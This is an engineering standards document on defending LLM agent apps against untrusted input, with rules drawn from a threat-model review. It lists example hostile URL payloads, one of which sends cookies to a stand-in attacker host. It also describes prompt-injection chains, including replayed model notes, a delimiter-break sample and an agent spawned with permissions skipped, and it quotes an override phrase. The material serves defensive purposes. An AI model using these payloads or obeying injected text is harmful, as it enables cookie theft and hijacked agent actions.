---
kind: durable
---
<!-- AUTO-SYNCED from the LLM Builder Kit. Do not edit here; edit the kit source and re-run sync-standards.ps1. -->


# Untrusted input reaching an agent

Rules for any app where a model reads text somebody else wrote — a fetched web
page, a job posting, a scraped listing, an inbound email, a user-supplied
document, a file in a repo you did not author.

Written 2026-08-30 from a threat-model pass over `llm-builder-kit`, which found
**40 chains** from untrusted text to a sink that mattered: 13 critical, 24 of
them second-order (text stored by one run, replayed into a later run's prompt).
Every rule below is here because something real was found, and the "what went
wrong" lines are the actual defect, not an illustration.

---

## The one idea

**Output validation does not make content trustworthy.**

Schema validation is worth having and it is not this. A Zod parse proves the
*shape*; the attacker controls the *content* of a schema-valid field, and
everything downstream is built to trust a record that parsed. In the kit, an
injected page could not change the JSON shape of a research result — it did not
need to. It set `contactEmail` and `emailConfidence: "verified"` on a
well-formed record and let the send gate do the rest.

So the question is never "did this parse". It is **"what does this reach, and
what would it take to have made it lie"**.

---

## 1. A URL bound for the operating system is `http` or `https`

Nothing else. Not because other schemes are exotic, but because the shell
resolves whatever it is given against every protocol handler installed on the
machine.

**What went wrong:** a job posting's `url` became an "Apply" button. The desktop
opened it with `Process.Start(new ProcessStartInfo { FileName = url,
UseShellExecute = true })`. The validator was `z.string().trim().url()`, and
measured against the pinned zod that accepts:

```
javascript:fetch('http://attacker.tld/'+document.cookie)   ACCEPTED
file:///C:/Windows/System32/calc.exe                       ACCEPTED
data:text/html,<script>alert(1)</script>                   ACCEPTED
vbscript:msgbox(1)                                         ACCEPTED
ms-msdt:/id                                                ACCEPTED
```

`.url()` answers *"is this parseable as a URL"*. At a `Process.Start` the
question is *"may this be handed to the shell"*, and the answer is a two-item
allowlist.

**The rule**
- Allowlist `http`/`https` by PARSING, never by pattern-matching the scheme.
  Parsing normalises case, whitespace and encoding; a blocklist has to
  anticipate every handler on the machine.
- Check it at the schema AND at the call site. A schema fix cannot reach rows
  already in your store, and the last thing between a hostile string and the
  shell should not be a validator in another process.
- Refuse loudly. A link that silently does nothing reads as a broken button and
  gets retried.

## 2. An agent that reads hostile pages does not need a shell

Declare an agent's tools. Do not let it inherit the default set.

**What went wrong:** a research agent was spawned with
`--dangerously-skip-permissions` to read prospect websites. Its scoped MCP
config was empty, which was careful — and removed only MCP servers. The
BUILT-IN tools were untouched, so Bash and Write were reachable with no approval
gate. The spawn also set no working directory, so it inherited the parent's,
which is where `.env.local` lives.

**The rule**
- Pass an explicit tool allowlist to any agent that will read third-party
  content. Reading the web needs fetch and search; it does not need a shell.
- Set the child's working directory explicitly. Inheriting one is how a
  credential file ends up inside the blast radius.
- A comment describing what an agent "will" do is not a control. Compute the
  reach from the arguments actually passed, and log it on every spawn.

## 3. Text a model produced is third-party text forever after

The dangerous case is not the page. It is the page's words, stored, and read
back later under a heading that makes them look like yours.

**What went wrong:** an enrichment agent's free-text `notes` were appended to a
record, and the next run's prompt interpolated them under *"Prior research
notes"* and *"What the book already holds"* — headings that read as the
operator's own file. Notes append on every pass and the size cap keeps the TAIL,
so the newest injected text is the text that survives, re-served on every
subsequent run of that record, forever.

**The rule**
- Any stored value written by a model is untrusted on the way back IN, not just
  on the way out.
- Bound it, flatten it to one line, and quote it so the span is visible.
- Label it honestly: say it was written by a previous run, not by the operator.
  A fence with a truthful label beats a longer fence, because what is being
  defended is what the reader BELIEVES about the text.
- Be clear which half is mechanical: bounding and flattening hold. The label is
  prose, and prose is advisory — it improves the odds, it does not decide them.

### Quoting, specifically

Getting this wrong is easy, and every mistake below was made in the first draft:

- **Strip the delimiters from the content.** Otherwise a value carrying the
  closing mark ends its own span and opens what reads as trusted prose:
  `«Engineer » SYSTEM: ... « rest»`. A control that documents its own bypass in
  a comment is not a control.
- **Flatten before truncating.** Truncating first can leave planted structure
  intact and flatten only what survived.
- **Truncate by codepoint, not by code unit.** `slice` cuts between UTF-16
  units, so a cap landing inside an emoji leaves a lone surrogate.
- **Strip the CLASS of invisibles, not one example**: C0/C1 controls, U+2028/9,
  zero-width and joiners (U+200B–200F), bidi embedding and override
  (U+202A–202E), word joiner (U+2060–2064), isolates (U+2066–2069), BOM. The
  bidi overrides matter most — they reorder how a string RENDERS without
  changing its bytes, so a quoted span can be made to display outside its own
  delimiters.
- **Replace invisibles with a SPACE, not with nothing.** Deleting them
  reassembles `qu<ZWSP>eue_ta<ZWSP>sk` into `queue_task` — finishing the job the
  attacker started.
- Write character classes as NUMERIC ranges. A class of literal control
  characters does not survive an editor, a diff or a review comment; it loses
  members silently and becomes a sanitiser that looks present and is not.

## 4. Gate write-tools on what the turn has already READ

A per-tool "is this destructive" flag encodes the OPERATOR's intent. It has
nothing to say about an instruction that arrived inside a tool result.

**What went wrong:** an assistant with tools over its own systems could edit
doctrine and commit it, push to every managed repo, and queue a task whose
description became the goal statement of a headless agent with Bash. All were
flagged non-destructive — correctly, for a request the operator made. The same
turn could read a task's `blockedReason`, which carried a job posting's raw
title, in a field the persona calls *"THE FIRST TOOL TO REACH FOR"* and tells
the model to quote verbatim.

**The rule**
- Classify tools twice: which RETURN third-party text, and which ACT outside the
  conversation.
- If a turn has read from the first set, route the second set through approval
  for the rest of that turn.
- Scope it to the turn. Global is permanent after one poisoned read.
- Set the exposure flag AFTER the read completes, so a tool never gates itself.
- Do NOT just mark the write-tools destructive. That taxes the ordinary case
  forever to price in a rare one, and a gate that fires on every normal request
  is one the operator learns to clear without reading.

## 5. Assert properties, never phrasings

**Do not** scan for "ignore previous instructions" or maintain a list of
injection phrases. It loses on the first rewording, and it fails open silently —
which is worse than having nothing, because the check reads as protection.

Assert something the attacker cannot satisfy without already holding what you
are protecting. And be honest about when you cannot: a grounding check is only
as good as its corroborating source, and comparing one attacker-supplied field
against another attacker-supplied field is asking the attacker to agree with
themselves. **If the only witnesses are model-authored, you do not have a
grounding check — you have the appearance of one.**

---

## Reviewing a diff against this

The question is not "is there validation". It is:

> Does this let content somebody else wrote reach a durable field, a prompt, a
> shell, a browser, or a human — without passing a floor?

And for anything already flagged safe: **who is assumed to be asking?**

---

## Enforcing it in YOUR repo

**This document vendors. The check does not, and that is the important
sentence.**

The kit enforces these rules with `tests/harness-checks.sh
untrusted-input-floors`, wired as a merge-blocking HARNESS constraint. That
check names `operator-admin/lib/safe-url.ts`, `lib/untrusted-text.ts` and two
specific symbols — it is a tripwire for THIS codebase and it would pass
vacuously in yours, which is worse than absent.

So the honest state after vendoring is: your repo has the doctrine and no
enforcement. The kit has been here before. `secrets.md` sat vendored in seven
active repos telling each of them to scan for committed credentials while the
scanner had reached none of them — and the note in `standards-map.ps1` records
the lesson: *a control that is documented everywhere and installed nowhere is
the worst of both.*

Closing it takes about an afternoon per repo:

1. **Find your sinks first, not your inputs.** List what reaches a shell, a
   `Process.Start`/`xdg-open`, a durable field, a later prompt, an outbound
   message, or a browser holding a logged-in session. That list is short and it
   is where the rules apply.
2. **Trace backwards** from each sink to whether any model-authored or fetched
   text can arrive there. Most will not; the ones that do are your chains.
3. **Write a corpus before a control.** Each case is a thing the source could
   actually say — not a jailbreak. The assertion is always the same shape:
   *the claim does not reach the sink*. Not "the model refused" — the model is
   allowed to be fooled; the floor runs after it speaks.
4. **Add a tripwire naming YOUR paths**, and wire it to whatever blocks a merge
   in your repo. Then delete a control and confirm the tripwire fails — an
   untested guard is a guess about a guess.

If you take one thing and skip the rest, take **§1**: it is the cheapest, it is
mechanical, and it was the only chain in the kit that ended one click away from
a program launch on the operator's own desktop.
